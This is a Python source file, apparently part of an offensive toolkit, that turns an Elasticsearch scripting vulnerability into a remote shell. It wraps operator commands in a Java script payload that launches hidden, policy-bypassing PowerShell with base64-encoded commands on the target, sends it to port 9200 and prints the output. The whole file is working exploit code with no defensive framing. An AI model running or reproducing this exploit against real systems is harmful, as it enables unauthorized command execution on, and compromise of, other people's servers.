import base64
import json
import requests
from shells.shell import Shell

class ESShell(Shell):
    '''Class for interacting with ElasticSearch vulnerability like a shell'''
    PORT = 9200
    JAVA = '''import java.io.*;
import java.util.stream.Collectors;
new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec("powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {cmd}").getInputStream())).lines().collect(Collectors.joining("\n"));'''

    def __init__(self, target: str, os: str):
        self.url = f'http://{target}:{self.PORT}/_search'
        super().__init__(target, os)
    
    def cmd(self, cmd: str, print_r = False) -> bool:
        '''Run a command in the shell'''
        # Format payload with commmand
        encoded_cmd = base64.b64encode(cmd.encode('utf-16le')).decode()
        java = self.JAVA.format(cmd=encoded_cmd)
        payload = {
            'size': 1,
            'query': {
                'filtered': {
                    'query': {
                        'match_all': {}
                    }
                }
            },
            'script_fields': {
                'msf_result': {
                    'script': java
                }
            }
        }
        
        # Send payload with command
        try:
            r = requests.post(f'http://{self.target}:{self.PORT}/_search', json.dumps(payload))
        except requests.exceptions.ConnectionError:
            self.error(self.target, 'Connection error')
            return False
        
        if r.status_code == 200:
            # If print response is true, find the output in the result json and print it
            if print_r:
                try:
                    res = json.loads(r.text)
                    self.print_output(res['hits']['hits'][0]['fields']['msf_result'][0])
                except Exception:
                    # self.print_output(r.text)
                    self.print_output('Failed for unknown reason')
            return True
        else:
            self.error(self.target, 'Response code was ' + str(r.status_code))
            return False
    
    def kill(self):
        '''Close the shell'''
        pass
